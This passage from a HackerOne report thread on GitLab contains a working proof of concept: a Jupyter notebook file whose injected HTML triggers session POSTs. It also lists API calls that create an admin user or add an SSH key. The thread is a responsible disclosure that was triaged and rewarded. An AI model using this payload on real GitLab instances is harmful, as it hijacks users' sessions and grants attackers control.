"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=12efbf8885958d54a685ad1d903301da963c3e23cbc470e4fa7d405220652c4e"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 14494567,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I am going to try to clean this up a bit. The report got a bit verbose, so here is a TLDR:\n\n### Minimal working POC\nPut this in a file named `name.ipynb`, and save it. This POC uses the simplest but least impactful of the two JavaScript classes described above. But it allows for a clean way to just prove that a POST is sent. I have striped as much Notebook text as I could without breaking rendering. I also realized that the \"refresh\" functionality can be achieved by simply emitting any link in the `href`.\n\nSo if the payload does not mount, just click the link to refresh the page. When it mounts it will turn to a blue dot. Hover over the dot to get a popup, click the \"OK\" button to trigger the POST request. In this POC it makes a request to follow one of my GitLab accounts. (This is the FULL file content, nothing else is needed)\n\n```\n{\n  \"cells\": [\n    {\n      \"cell_type\": \"code\",\n      \"outputs\": [\n        {\n          \"output_type\": \"display_data\",\n          \"data\": {\n            \"text/html\": [\n              \"<a href class=\\\"js-feature-highlight\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/users/8891840/follow\\\">\",\n              \"click to refresh\",\n              \"</a>\"\n            ]\n          }\n        }\n      ]\n    }\n  ]\n}\n```\n\n### Make it dangerous\nReplace the `data-dismiss-endpoint` in the POC above with either the \"create admin\" or the \"add ssh key\" from my POCs above\n\n* `api/v4/users?admin=true&email=joaxcar@wearehackerone.com&name=newadmin&username=newadmin&password=asdasdasdasd&skip_confirmation=true`\n* `api/v4/user/keys?title=hack&key=KEYPHINGERPRINT`\n\n### What is the problem\n\"Safe HTML\" is generated in GitLab by using DOMPurify. The configuration as of now does NOT strip\n\n* Style tags and attributes (I know you are working on this)\n* Arbitrary `data-*` attributes.\n* Arbitrary class names\n\nWhich makes it possible to abuse GitLab's own JS code when the user can inject html. In this case Notebooks is used for this as they allow html in cells.\n\nAs a bonus the `persistant user callout` code contains a `window.open` call that can be used for tabnabbing. It is also important to note that the exposed code (`persistant user callout`) allows for \"stacking\" multiple payloads that can be executed after each other if the user continue to interact with the page.\n\nHope that clears things up. Sorry for not taking the time to clean it up prior to reporting, but I kind of figured it out as I was revisiting the issue.\n\nBest regards\nJohan",
      "automated_response": false,
      "created_at": "2021-11-30T21:17:28.202Z",
      "updated_at": "2021-11-30T21:17:28.202Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=12efbf8885958d54a685ad1d903301da963c3e23cbc470e4fa7d405220652c4e"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 14521455,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi again @forest_dweller , I know that triaging can take some time and I have no problem waiting. I just wanted this report to be submitted in the timeframe for GitLab bug contest ( https://about.gitlab.com/blog/2021/11/01/3rd-annual-bug-bounty-contest/#----three-year-anniversary-hacking-contest--- ) which have its deadline tomorrow (3d dec). Hopefully it does not matter if it gets triaged after the deadline, but as you managed to reproduce the base issue maybe we could send it to GitLab triage team?\n\nMaybe not the critical impact that will blow all the competition out of the way, but I like to have a tiny chance of some nice swag :)\n\nBest regards\nJohan",
      "automated_response": false,
      "created_at": "2021-12-02T15:16:41.688Z",
      "updated_at": "2021-12-02T15:16:41.688Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=12efbf8885958d54a685ad1d903301da963c3e23cbc470e4fa7d405220652c4e"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 14521510,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey @joaxcar,\n\nI only saw your last message and didn't look at the rest of the report yet, but the contest works with with submission date so you're fine. ;)\n\nBest regards,\nDominic\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2021-12-02T15:25:19.317Z",
      "updated_at": "2021-12-02T15:25:19.317Z",
      "actor": {
        "username": "dcouture",
        "cleared": false,
        "verified": false,
        "url": "/dcouture",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 14554924,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportVulnerabilityTypesUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2021-12-06T05:53:07.798Z",
      "updated_at": "2021-12-06T05:53:07.798Z",
      "additional_data": {
        "added_weaknesses": [
          {
            "id": 72,
            "name": "Resource Injection"
          }
        ],
        "removed_weaknesses": [
          {
            "id": 58,
            "name": "Command Injection - Generic"
          }
        ]
      },
      "actor": {
        "username": "h1_analyst_amey",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_amey",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/752nxtq8olqtr0zhu4h2jazs3137/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22kimo-pZYzGNUgWbY-unsplash%20%25281%2529.jpg%22%3B%20filename%2A%3DUTF-8%27%27kimo-pZYzGNUgWbY-unsplash%2520%25281%2529.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5a47a02b9c661dbe00b459808e015707a6c03d1b46a916c59c5fd6daaf9e22fe"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 14554975,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugPendingProgramReview",
      "message": "Hello @joaxcar,\n\nNice Find! Thank you for patiently answering all our questions.\n\nI was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nAll the best for your next find! Look forward to your next awesome bug report!\n\nCheers,\n@forest_dweller",
      "automated_response": false,
      "created_at": "2021-12-06T06:03:14.678Z",
      "updated_at": "2021-12-06T06:03:14.678Z",
      "actor": {
        "username": "h1_analyst_amey",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_amey",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/752nxtq8olqtr0zhu4h2jazs3137/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22kimo-pZYzGNUgWbY-unsplash%20%25281%2529.jpg%22%3B%20filename%2A%3DUTF-8%27%27kimo-pZYzGNUgWbY-unsplash%2520%25281%2529.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5a47a02b9c661dbe00b459808e015707a6c03d1b46a916c59c5fd6daaf9e22fe"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 14569846,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Hello @joaxcar,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/347284.  This issue will be made public 30 days following the release of a patch.\n\nGiven the severity of the report, we are paying an initial $1000 on triage. Congratulations!\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nDominic\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2021-12-07T00:59:53.274Z",
      "updated_at": "2021-12-07T00:59:53.274Z",
      "actor": {
        "username": "dcouture",
        "cleared": false,
        "verified": false,
        "url": "/dcouture",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 14569848,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "",
      "automated_response": false,
      "created_at": "2021-12-07T01:00:10.473Z",
      "updated_at": "2021-12-07T01:00:10.473Z",
      "actor": {
        "url": "/gitlab",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "GitLab"
        }
      },
      "bounty_amount": "1000.0",
      "bonus_amount": "0.0",
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "gitlab",
      "collaborator": {
        "username": "joaxcar",
        "url": "/joaxcar"
      }
    },
    {
      "id": 14577002,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thank you @forest_dweller for looking at the report and triaging it. I realized that my video with the SSH key lost the grand finale, as I had to re-record it. It was supposed to end with a shell command proving that the SSH key did get activated on the user. But If you try it yourself, you see it works! :)\n\nAnd thank you @dcouture for triaging and the bounty! I started to look into the possibility to abuse the fact that GraphQL mutations can be stacked to perform multiple mutations in one POST request. But as the GraphQL API at the moment don't contain any actions as dangerous as \"create admin user\", I did not dig too deep into it. I will get back if I find some interesting vector there.",
      "automated_response": false,
      "created_at": "2021-12-07T11:18:31.713Z",
      "updated_at": "2021-12-07T11:18:31.713Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=12efbf8885958d54a685ad1d903301da963c3e23cbc470e4fa7d405220652c4e"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 15093762,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "ETA for fix:\n\nHi @joaxcar,\n\nThe issue you reported is currently scheduled to be fixed by 2022-02-28.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n",
      "automated_response": true,
      "created_at": "2022-01-19T04:04:31.302Z",
      "updated_at": "2022-01-19T04:04:31.302Z",
      "actor": {
        "username": "gitlab-securitybot",
        "cleared": false,
        "verified": false,
        "url": "/gitlab-securitybot",
